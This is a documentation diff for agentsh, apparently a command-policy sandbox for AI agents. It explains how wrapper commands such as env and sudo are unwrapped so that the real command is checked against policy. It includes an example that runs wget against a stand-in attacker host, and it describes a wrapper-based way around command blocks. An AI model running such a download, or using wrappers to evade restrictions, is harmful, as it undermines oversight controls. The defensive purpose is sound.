@@ -364,6 +364,61 @@ connect_redirect:
     rewrite_sni: "mycompany.openai.azure.com"
 ```
 
+## Transparent Commands
+
+Transparent commands are wrapper/interpreter commands (like `env`, `sudo`, `nice`) that don't perform meaningful work themselves — they just launch another command. When execve interception is enabled, agentsh automatically "unwraps" these wrappers to find and evaluate the real payload command against policy.
+
+### How It Works
+
+1. A process calls `execve("/usr/bin/env", ["env", "wget", "http://evil.com"])`
+2. agentsh recognizes `env` as a transparent command
+3. It unwraps to find the payload: `wget`
+4. Both `env` (wrapper) and `wget` (payload) are evaluated against command rules
+5. The **most restrictive** decision wins — if either is denied, the execution is denied
+
+This prevents bypass attacks where a blocked command is launched through an allowed wrapper.
+
+### Built-in Transparent Commands
+
+| Platform | Commands |
+|----------|----------|
+| All | `env`, `nice`, `nohup`, `sudo`, `time`, `xargs` |
+| Linux | `busybox`, `doas`, `strace`, `ltrace`, `ld-linux*` |
+| Windows | `cmd.exe`, `powershell.exe`, `pwsh.exe`, `wsl.exe` |
+
+### Policy Configuration
+
+You can add or remove transparent commands via the `transparent_commands` policy field:
+
+```yaml
+# Add custom wrappers or remove built-in ones
+transparent_commands:
+  add:
+    - myrunner        # Custom launcher that wraps commands
+    - taskrunner      # CI task runner
+  remove:
+    - sudo            # Don't unwrap sudo (treat as opaque command)
+```
+
+### Unwrap Behavior
+
+- **Depth limit:** Chained wrappers are unwrapped up to 5 levels deep (e.g., `sudo nice env wget`)
+- **Flag skipping:** Flags (`-x`, `--flag=value`) and environment assignments (`FOO=bar`) are skipped to find the payload
+- **Double-dash:** `--` ends flag parsing; the next argument is always the payload
+- **Fail-safe:** If the heuristic identifies the wrong argument as the payload, it will not match any command rule and hit default-deny — the safe outcome
+
+### Audit Events
+
+When transparent unwrapping occurs, audit events include additional fields:
+
+| Field | Description |
+|-------|-------------|
+| `unwrapped_from` | The original wrapper command (e.g., `/usr/bin/env`) |
+| `payload_command` | The unwrapped payload (e.g., `wget`) |
+| `raw_filename` | Original path before symlink canonicalization |
+
+These fields help detect bypass attempts in audit logs.
+
 ## Troubleshooting
 
 ### Variable Not Expanding
